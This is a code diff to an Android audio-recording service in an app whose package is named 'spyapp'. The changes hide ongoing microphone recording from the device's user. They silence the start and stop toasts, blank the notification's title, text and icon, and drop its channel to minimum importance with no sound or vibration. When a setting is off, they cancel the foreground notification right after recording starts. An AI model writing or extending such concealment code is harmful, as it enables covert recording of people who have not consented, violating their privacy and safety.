@@ -30,6 +30,7 @@ import androidx.core.app.NotificationCompat;
 import com.example.grabadorvoz.Service.BroadcastReceiver.StopServiceReceiver;
 import com.example.grabadorvoz.data.FileManager;
 import com.example.grabadorvoz.manager.managerData;
+import com.example.grabadorvoz.widgets.WidgetProvider.updateWidget;
 import com.galvancorp.spyapp.R;
 
 import java.io.File;
@@ -41,6 +42,7 @@ import java.util.Random;
 
 public class GrabacionService extends Service {
 
+    private updateWidget widget;
     private managerData data;
     private NotificationManager manager;
     private MediaRecorder recorder = null;
@@ -55,16 +57,22 @@ public class GrabacionService extends Service {
             cacheDir.mkdirs();
         }
         fileName = new File(cacheDir, "audiorecord_" + getDate() + ".mp3").getAbsolutePath();
-        showToast(this, this.getString(R.string.serviceStart),true);
+        //showToast(this, this.getString(R.string.serviceStart),true);
         data.saveBoolean(IS_SERVICE,true);
     }
 
     @SuppressLint("ForegroundServiceType")
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        createNotificationChannel();
-        if (data.getBooleanNotidication(NOTIFICATION)) startForeground(1, createSilentNotification());
-        else { startForeground(1, createSilentNotification2());}
+        widget = new updateWidget(this);
+        manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+        if (data.getBooleanNotidication(NOTIFICATION)) {
+            createNotificationChannel();
+            startForeground(1, createSilentNotification());
+        }else {
+            createNotificationChannelSilets();
+            startForeground(1, createSilentNotification2());
+        }
         startRecording();
         return START_STICKY;
     }
@@ -72,10 +80,9 @@ public class GrabacionService extends Service {
     private Notification createSilentNotification2() {
         NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
-                .setCategory(NotificationCompat.CATEGORY_SERVICE)
+                .setCategory(NotificationCompat.GROUP_KEY_SILENT)
                 .setSilent(true);
         builder.setContentTitle("")
-                .setSmallIcon(R.drawable.logo_app)
                 .setContentText("");
 
         return builder.build();
@@ -89,10 +96,11 @@ public class GrabacionService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        showToast(this, this.getString(R.string.serviceStop),true);
+        //showToast(this, this.getString(R.string.serviceStop),true);
         stopRecording();
         manager.cancel(1);
         data.saveBoolean(IS_SERVICE,false);
+        widget.changeLayout(this, GrabacionService.class,false);
     }
 
     @SuppressLint("RestrictedApi")
@@ -108,6 +116,8 @@ public class GrabacionService extends Service {
         } catch (IOException e) {
             Log.e(LOG_TAG, "prepare() failed",e);
         }
+        if (!data.getBooleanNotidication(NOTIFICATION)) manager.cancel(1);
+        widget.changeLayout(this, GrabacionService.class,true);
     }
 
     private void stopRecording() {
@@ -140,7 +150,20 @@ public class GrabacionService extends Service {
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Servicio de Notificador", NotificationManager.IMPORTANCE_HIGH);
-            manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+            manager.createNotificationChannel(channel);
+        }
+    }
+
+    private void createNotificationChannelSilets(){
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    CHANNEL_ID,
+                    "Servicio de Notificador",
+                    NotificationManager.IMPORTANCE_MIN
+            );
+            channel.enableLights(false);
+            channel.enableVibration(false);
+            channel.setSound(null, null);
             manager.createNotificationChannel(channel);
         }
     }
